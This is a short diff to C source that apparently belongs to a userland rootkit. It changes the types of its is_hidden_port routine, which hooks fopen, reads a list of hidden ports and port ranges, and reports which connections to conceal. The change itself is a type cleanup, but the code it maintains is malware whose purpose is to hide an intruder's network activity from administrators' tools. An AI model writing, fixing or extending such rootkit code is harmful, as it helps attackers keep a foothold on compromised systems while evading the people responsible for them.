@@ -1,10 +1,10 @@
-int is_hidden_port(int port){
+int is_hidden_port(unsigned short port){
     preparehideports(readgid());
 
     FILE *fp;
     char buf[13], *buf_tok = NULL;
-    int hidden_status = 0,
-        low_port, high_port;
+    int hidden_status = 0;
+    unsigned short low_port, high_port;
 
     hook(CFOPEN);
     fp = call(CFOPEN, HIDEPORTS, "r");
@@ -15,11 +15,11 @@ int is_hidden_port(int port){
 
         if(strstr(buf, "-")){   /* hide specific port ranges */
             /* get the lowest and highest ports within the range... */
-            buf_tok = strtok(buf, "-");
-            low_port = atoi(buf_tok);       /* low */
+            buf_tok = strtok(buf, "-");    /* low */
+            low_port = (unsigned short)atoi(buf_tok);
 
-            buf_tok = strtok(NULL, "-");
-            high_port = atoi(buf_tok);      /* high */
+            buf_tok = strtok(NULL, "-");   /* high */
+            high_port = (unsigned short)atoi(buf_tok);
 
             /* current port we're checking is within our specified hidden range. */
             if(port >= low_port && port <= high_port){
@@ -28,7 +28,7 @@ int is_hidden_port(int port){
             }
         }
 
-        if(port == atoi(buf)){   /* current port we're checking is hidden */
+        if(port == (unsigned short)atoi(buf)){   /* current port we're checking is hidden */
             hidden_status = 1;
             break;
         }
